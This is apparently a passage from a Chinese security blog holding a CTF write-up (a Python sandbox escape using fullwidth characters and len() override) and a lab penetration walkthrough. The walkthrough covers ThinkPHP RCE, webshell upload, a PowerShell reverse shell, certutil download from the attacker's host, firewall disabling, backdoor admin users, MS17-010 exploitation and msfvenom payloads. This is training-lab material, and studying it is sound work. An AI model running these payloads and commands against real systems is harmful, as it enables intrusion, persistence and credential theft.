class="line">__import__(&#x27;sys&#x27;).addaudithook(my_audit_hook)</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">    print(source_code)</span><br><span class="line">    code = hook_code + source_code</span><br><span class="line">    tree = compile(source_code, &quot;run.py&quot;, &#x27;exec&#x27;, flags=ast.PyCF_ONLY_AST)  # flags=ast.PyCF_ONLY_AST, 这指定了将字符串编译为抽象语法树, 而不是编译成可执行的字节码</span><br><span class="line">    try:</span><br><span class="line">        if verify_secure(tree):  # 继续跟进到 verify_secure() 自定义函数, 返回 true 则往下执行</span><br><span class="line">            with open(&quot;run.py&quot;, &#x27;w&#x27;) as f: </span><br><span class="line">                f.write(code)  # 将 code(hook_code 和 传入的值拼接的字符串) 写入 run.py 文件中</span><br><span class="line">            result = subprocess.run([&#x27;python&#x27;, &#x27;run.py&#x27;], stdout=subprocess.PIPE, timeout=5).stdout.decode(&quot;utf-8&quot;)  # 用 python 运行 run.py 并捕获执行结果传入给 result</span><br><span class="line">            os.remove(&#x27;run.py&#x27;)</span><br><span class="line">            return result # 返回执行结果</span><br><span class="line">        else:  # 返回 false 则返回报错字符串</span><br><span class="line">            return &quot;Execution aborted due to security concerns.&quot;</span><br><span class="line">    except:</span><br><span class="line">        os.remove(&#x27;run.py&#x27;)</span><br><span class="line">        return &quot;Timeout!&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return app.send_static_file(&#x27;index.html&#x27;)   # 访问网站根目录，返回 index.html 静态文件给客户端</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/blockly_json&#x27;, methods=[&#x27;POST&#x27;])  # 当请求 /blockly_json 且请求方式为 POST 时执行下面代码</span><br><span class="line">def blockly_json():</span><br><span class="line">    blockly_data = request.get_data()  # 返回 data 请求体, 这里是 json 数据</span><br><span class="line">    print(type(blockly_data))</span><br><span class="line">    blockly_data = json.loads(blockly_data.decode(&#x27;utf-8&#x27;)) # 将 JSON 格式的字符串解析为 Python 对象, 这样才能对字符串进行python操作</span><br><span class="line">    print(blockly_data)</span><br><span class="line">    try:</span><br><span class="line">        python_code = json_to_python(blockly_data)  # 调用 json_to_python 自定义函数，这里跟进到 json_to_python 自定义函数中去</span><br><span class="line">        return do(python_code) # 跟进到 do 自定义函数</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return jsonify(&#123;&quot;error&quot;: &quot;Error generating Python code&quot;, &quot;details&quot;: str(e)&#125;)  # 将报错及字典内容转换为 json 响应格式, 并将内容返回给客户端</span><br><span class="line">    </span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host = &#x27;0.0.0.0&#x27;)</span><br></pre></td></tr></table></figure></div>

<p>程序会先将输入的数据进行处理，并与 <code>hook_code</code> 进行拼接，然后将拼接后的内容写入 <code>run.py</code> 并执行，返回执行结果</p>
<p>hook_code，关键代码块如下，当输入 xxx 时，程序会将输入的字符拼接在下面并执行代码</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">def my_audit_hook(event_name, arg):</span><br><span class="line">    blacklist = [&quot;popen&quot;, &quot;input&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;compile&quot;, &quot;memoryview&quot;]</span><br><span class="line">    if len(event_name) &gt; 4:</span><br><span class="line">        raise RuntimeError(&quot;Too Long!&quot;)</span><br><span class="line">    for bad in blacklist:</span><br><span class="line">        if bad in event_name:</span><br><span class="line">            raise RuntimeError(&quot;No!&quot;)</span><br><span class="line"></span><br><span class="line">__import__(&#x27;sys&#x27;).addaudithook(my_audit_hook)</span><br><span class="line">xxx</span><br></pre></td></tr></table></figure></div>

<p>解题思路，写入 <code>__import__(os).system(whoami)</code> ，命令注入，但会被 <code>if len(event_name) &gt; 4: raise RuntimeError(&quot;Too Long!&quot;)</code>  拦截</p>
<p>绕过思路：</p>
<p><code>locals()</code> 包含常见的函数，使用 <code>update()</code> 覆盖 <code>len()</code> 函数，当用 <code>len()</code> 函数时去执行匿名函数 <code>lambda x:4</code>，让其只返回 4</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">locals().update(&#123;&quot;len&quot;:lambda x:4&#125;);__import__(&quot;os&quot;).system(&quot;whoami&quot;)</span><br></pre></td></tr></table></figure></div>

<p>程序设置了黑名单，将 <code>$!</code> 等有特殊作用的字符全部过滤了，但是下面的代码存在编码转换绕过</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">code =  &quot;&#x27;&quot; + unidecode.unidecode(block[&#x27;fields&#x27;][&#x27;TEXT&#x27;]) + &quot;&#x27;&quot;</span><br><span class="line"># 将字符进行unidecode解码(用于处理特殊字符，这里存在特殊字符全角转换绕过)并拼接给code</span><br></pre></td></tr></table></figure></div>

<p>半角全角编码转换 py 脚本</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">def to_fullwidth(text):</span><br><span class="line">    return &#x27;&#x27;.join([chr(ord(char) + 0xFEE0) if &#x27;!&#x27; &lt;= char &lt;= &#x27;~&#x27; else char for char in text])</span><br><span class="line"></span><br><span class="line">def to_halfwidth(text):</span><br><span class="line">    return &#x27;&#x27;.join([chr(ord(char) - 0xFEE0) if &#x27;！&#x27; &lt;= char &lt;= &#x27;～&#x27; else char for char in text])</span><br><span class="line"></span><br><span class="line"># 示例用法</span><br><span class="line">text = &quot;!!!&quot;</span><br><span class="line">print(&quot;全角:&quot;, to_fullwidth(text))  # 转换为全角</span><br><span class="line">print(&quot;半角:&quot;, to_halfwidth(to_fullwidth(text)))  # 转换为半角</span><br></pre></td></tr></table></figure></div>

<p>假如输入一个中文，会转为<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241107163216101.png" class title="image-20241107163216101"></p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241107170231102.png" class title="image-20241107170231102">

<p>输入全角的 <code>!!!</code>，可以看到对方会解析成正常的 <code>!!!</code></p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241107170243066.png" class title="image-20241107170243066">

<p>通过网站根目录 JS 服务发送的请求体中，是 <code>[&#39;blocks&#39;][blocks][&#39;type&#39;]==&#39;print&#39;</code> ，因此最终 code 代码会被 <code>f&quot;print(&#123;text&#125;)&quot;</code> 包裹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if block_type == &#x27;print&#x27;:</span><br><span class="line">    text_block = block[&#x27;inputs&#x27;][&#x27;TEXT&#x27;][&#x27;block&#x27;]</span><br><span class="line">    text = block_to_python(text_block)</span><br><span class="line">    code = f&quot;print(&#123;text&#125;)&quot;</span><br></pre></td></tr></table></figure></div>

<p>最终命令注入时闭合： <code>&#39;);xxxx#</code></p>
<p>最终 Payload </p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;);locals().update(&#123;&quot;len&quot;:lambda x:4&#125;);__import__(&quot;os&quot;).system(&quot;whoami&quot;)#</span><br></pre></td></tr></table></figure></div>

<p>半角转全角</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">＇）；ｌｏｃａｌｓ（）．ｕｐｄａｔｅ（｛＂ｌｅｎ＂：ｌａｍｂｄａ ｘ：４｝）；＿＿ｉｍｐｏｒｔ＿＿（＂ｏｓ＂）．ｓｙｓｔｅｍ（＂ｗｈｏａｍｉ＂）＃</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241107183154329.png" class title="image-20241107183154329">

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241107183037523.png" class title="image-20241107183037523">

<p>flag 文件权限级为 <code>root</code> ，当前权限为 <code>ctf</code> </p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241107183713575.png" class title="image-20241107183713575">

<p>dd 具有SUID位，有 <code>root</code> 权限，直接利用 <code>dd if=$FILES</code> 读取文件</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241107184411083.png" class title="image-20241107184411083">









]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CyberStrikeLab - lab1</title>
    <url>/2025/03/05/CyberStrikeLab-lab1/</url>
    <content><![CDATA[<p>目标：本次小李的任务是攻克 192.168.10.0&#x2F;24 网段的所有主机，刚开始挺顺利，但深入后发现里面的情况远比想象中的复杂。</p>
<h2 id="外网信息探测"><a href="#外网信息探测" class="headerlink" title="外网信息探测"></a>外网信息探测</h2><p>查看存活主机</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.10.*</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302122910501.png" class title="image-20250302122910501">

<p>使用 fscan 对 192.168.10.* 网段进行扫描，发现 thinkphp poc检测出了漏洞</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250228114857535.png" class title="image-20250228114857535">

<p>站点如下</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250228115021823.png" class title="image-20250228115021823">



<h2 id="边界突破-192-168-10-10"><a href="#边界突破-192-168-10-10" class="headerlink" title="边界突破 - 192.168.10.10"></a>边界突破 - 192.168.10.10</h2><h3 id="ThinkPHP-5-0-23-RCE"><a href="#ThinkPHP-5-0-23-RCE" class="headerlink" title="ThinkPHP 5.0.23 RCE"></a>ThinkPHP 5.0.23 RCE</h3><p><strong>工具库利用</strong></p>
<p>使用 ThinkPHP 漏洞扫描工具进行历史漏洞扫描，发现大量 thinphp nday 都能打通</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250228115120674.png" class title="image-20250228115120674">

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250228115129755.png" class title="image-20250228115129755">

<p>上传一句话木马文件</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250228115200680.png" class title="image-20250228115200680">

<p>蚁剑连接成功</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250228115226573.png" class title="image-20250228115226573">

<p><strong>手工利用</strong></p>
<p>再换一种手工利用的手法</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET:  http://192.168.10.10/?s=captcha&amp;test=-1</span><br><span class="line">POST: _method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami</span><br></pre></td></tr></table></figure></div>

<p>执行有一瞬间出现命令执行结果，然后跳转至 404 页面</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302100619418.png" class title="image-20250302100619418">

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302100642312.png" class title="image-20250302100642312">

<p>接下来手工利用反弹 shell，nc 开启 22222 Port</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302100936292.png" class title="image-20250302100936292">

<p>生成 powershell 反弹命令，IP 选择 OpenVPN 分配的 IP 172.16.233.2</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302101132647.png" class title="image-20250302101132647">

<p>Base64 编码并执行，注意关闭防火墙或设置防火墙配置</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302101207302.png" class title="image-20250302101207302">

<p>成功得到 Shell</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302101308073.png" class title="image-20250302101308073">

<p>直接 &gt; 写入一句话木马发现每个字符间存在空字节，导致 PHP 解析错误；</p>
<p>系统内有 certutil，使用其下载本地准备好的一句话木马</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302103707223.png" class title="image-20250302103707223">

<p>本地开启 python web服务</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302104258607.png" class title="image-20250302104258607">

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f http://172.16.233.2:22223/1.php</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302104348794.png" class title="image-20250302104348794">

<p>一句话木马文件下载在网站根目录，蚁剑连接，成功</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302104244291.png" class title="image-20250302104244291">

<p>C 盘根目录拿下旗帜一</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302104554321.png" class title="image-20250302104554321">

<p><strong>上线 CS</strong></p>
<p>上传 CS 木马并执行</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302114942426.png" class title="image-20250302114942426">

<p>机器上线成功</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302115031318.png" class title="image-20250302115031318">

<p>禁用防火墙</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off 	//关闭所有防火墙，winsows server 2003 之后</span><br><span class="line">netsh advfirewall show allprofiles   //查询域、私有、共有防火墙状态</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302115723132.png" class title="image-20250302115723132">



<h3 id="3389-远程桌面连接"><a href="#3389-远程桌面连接" class="headerlink" title="3389 远程桌面连接"></a>3389 远程桌面连接</h3><p>开启 3389 端口</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302105830463.png" class title="image-20250302105830463">

<p>添加自定义用户</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user abcc 123@abc /add</span><br><span class="line">net localgroup Administrators abcc /add</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302105810303.png" class title="image-20250302105810303">

<p>尝试远程桌面连接</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302105950985.png" class title="image-20250302105950985">

<p>身份证验证导致的错误，直接禁用掉身份证验证</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v UserAuthentication /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302110101538.png" class title="image-20250302110101538">

<p>再次尝试，成功登录</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302111506571.png" class title="image-20250302111506571">

<h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><p>翻阅 phpstudy，找到数据库用户名密码</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">root/cyberstrike@2024</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302111740743.png" class title="image-20250302111740743">

<p>尝试使用 phpstudy 文件 mysql.exe 登录数据库，失败</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302113247646.png" class title="image-20250302113247646">

<p>phpstudy 中MYSQL并没有开启，尝试直接点击启动，会马上跳回关闭，启动失败</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302113617815.png" class title="image-20250302113617815">

<p>很奇怪的状态，对方是有 3306 端口使用的，我尝试查看当前 mysql 状态</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc query mysql</span><br></pre></td></tr></table></figure></div>

<p>state: 1 stopped，当前 mysql 并没有开启</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302113532666.png" class title="image-20250302113532666">

<p>接下来登录管理员命令行开启 mysql，Windows Server 2012R2 环境较老，win + R 在运行启用管理员命令行失败。打开任务管理器，点击文件，运行新任务，勾选以系统管理权限创建此任务，确定。</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302114148322.png" class title="image-20250302114148322">

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302114219492.png" class title="image-20250302114219492">

<p>启动 mysql 服务</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">net start mysql</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302114304781.png" class title="image-20250302114304781">

<p>再次尝试连接 MySQL，登录成功</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302114337558.png" class title="image-20250302114337558">

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302114613073.png" class title="image-20250302114613073">

<p>创建一个允许远程连接的用户并给予足够权限</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE USER &#x27;aabbcc&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;aabbcc&#x27;;</span><br><span class="line">GRANT ALL PRIVILEGES ON *.* TO &#x27;aabbcc&#x27;@&#x27;%&#x27;;</span><br><span class="line">FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302130321863.png" class title="image-20250302130321863">

<p>拿下数据库</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302130419465.png" class title="image-20250302130419465">



<h2 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h2><h3 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h3><p>外网机器是双网卡，目标内网还有一个 192.168.20.X 网段</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302190303722.png" class title="image-20250302190303722">

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303105119541.png" class title="image-20250303105119541">

<p><strong>Fscan 扫描</strong> </p>
<p>使用 fscan 对 20 段进行扫描</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">fscan.exe -h 192.168.20.0/24</span><br></pre></td></tr></table></figure></div>

<p>发现 20 和 30 都有永恒之蓝漏洞</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.20.20:139 open</span><br><span class="line">192.168.20.10:139 open</span><br><span class="line">192.168.20.10:3306 open</span><br><span class="line">192.168.20.30:445 open</span><br><span class="line">192.168.20.20:445 open</span><br><span class="line">192.168.20.10:445 open</span><br><span class="line">192.168.20.30:139 open</span><br><span class="line">192.168.20.30:135 open</span><br><span class="line">192.168.20.20:135 open</span><br><span class="line">192.168.20.10:80 open</span><br><span class="line">192.168.20.30:88 open</span><br><span class="line">192.168.20.10:135 open</span><br><span class="line">[*] NetBios 192.168.20.20   cyberweb.cyberstrikelab.com         Windows Server 2012 R2 Standard 9600</span><br><span class="line">[*] NetBios 192.168.20.10   WORKGROUP\WIN-KOHRC1DGOL9           Windows Server 2012 R2 Standard 9600</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]192.168.20.20</span><br><span class="line">   [-&gt;]cyberweb</span><br><span class="line">   [-&gt;]192.168.20.20</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]192.168.20.30</span><br><span class="line">   [-&gt;]WIN-7NRTJO59O7N</span><br><span class="line">   [-&gt;]192.168.20.30</span><br><span class="line">[+] MS17-010 192.168.20.20	(Windows Server 2012 R2 Standard 9600)</span><br><span class="line">[+] MS17-010 192.168.20.30	(Windows Server 2008 R2 Standard 7600)</span><br><span class="line">[*] WebTitle http://192.168.20.10      code:200 len:25229  title:易优CMS -  Powered by Eyoucms.com</span><br><span class="line">[+] PocScan http://192.168.20.10 poc-yaml-thinkphp5023-method-rce poc1</span><br></pre></td></tr></table></figure></div>

<h3 id="域控-192-168-20-30"><a href="#域控-192-168-20-30" class="headerlink" title="域控 - 192.168.20.30"></a>域控 - 192.168.20.30</h3><p><strong>CS 派发 MSF 会话</strong>，先开启MSF</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set LHOST 172.16.233.2</span><br><span class="line">set LPORT 4777</span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>

<p>CS 启动监听，配置与 MSF 一致</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303122413992.png" class title="image-20250303122413992">

<p>选择 192.168.10.10 会话，spawn 选择刚配置的监听，点击 Choose，MSF 成功接收到 CS 的会话</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303122832054.png" class title="image-20250303122832054">

<p>MSF 配置路由</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">run autoroute -s 192.168.20.0/24</span><br><span class="line">run autoroute -p  //观测路由是否添加成功</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303123219982.png" class title="image-20250303123219982">

<p>MSF 设置 Socks 代理</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">search socks || use auxiliary/server/socks_proxy</span><br><span class="line">set SRVHOST 172.16.233.2</span><br><span class="line">run</span><br><span class="line">sudo vi /etc/proxychains4.conf  //修改配置文件和选项设置的一致，且注意sock4、sock5一致</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303123310096.png" class title="image-20250303123310096">

<p>永恒之蓝漏洞利用，尝试模块，发现 ms17_010_command 能够被利用</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">search ms17_010</span><br><span class="line">use 19</span><br><span class="line">set COMMAND whoami</span><br><span class="line">set RHOSTS 172.16.233.2</span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303123725242.png" class title="image-20250303123725242">

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">set COMMAND &#x27;dir C:\&#x27;</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303123932158.png" class title="image-20250303123932158">

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">set COMMAND &#x27;type C:\flag.txt&#x27;</span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>

<p>拿到第二个旗帜 </p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303124022556.png" class title="image-20250303124022556">

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">set COMMAND &#x27;net user abcc 123@abc /add&#x27;</span><br><span class="line">set COMMAND &#x27;net localgroup Administrators abcc /add&#x27;</span><br><span class="line">set COMMAND &#x27;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f&#x27;</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303124059122.png" class title="image-20250303124059122">

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303124302763.png" class title="image-20250303124302763">

<p>远程桌面连接</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303124355986.png" class title="image-20250303124355986">

<p>.\用户名 登录，成功登录</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303154731381.png" class title="image-20250303154731381">

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303162638253.png" class title="image-20250303162638253">

<h3 id="域成员-192-168-20-20"><a href="#域成员-192-168-20-20" class="headerlink" title="域成员 - 192.168.20.20"></a>域成员 - 192.168.20.20</h3><p>这台机器使用永恒之蓝利用，但是一直利用失败，但因为我们已经拿下域控制器，所以换一种方式，去拿域控制器的 hash，对域成员做 PTH 攻击 </p>
<p>试了很久 CS 上线的问题，但仅仅在 MSF 做了代理，一直失败，因此考虑直接上线 MSF</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.20.10</span><br><span class="line">set lport 23231</span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.208.138 LPORT=6666 -f exe &gt; reverse.exe</span><br></pre></td></tr></table></figure></div>

<p>制作木马并上传，上传稍麻烦，因为代理问题，因此选择将木马上传到 192.168.10.10 主机上，通过 phpstudy 自带 php 开启 Web 服务，再通过 192.168.20.30 浏览器下载文件</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">php.exe -S 0.0.0.0:22222</span><br></pre></td></tr></table></figure></div>

<p>访问并保存，运行即可</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303165436865.png" class title="image-20250303165436865">

<p>运行时注意管理员身份运行</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303173105964.png" class title="image-20250303173105964">

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303165555703.png" class title="image-20250303165555703">

<p>获取 hash</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303173046901.png" class title="image-20250303173046901">

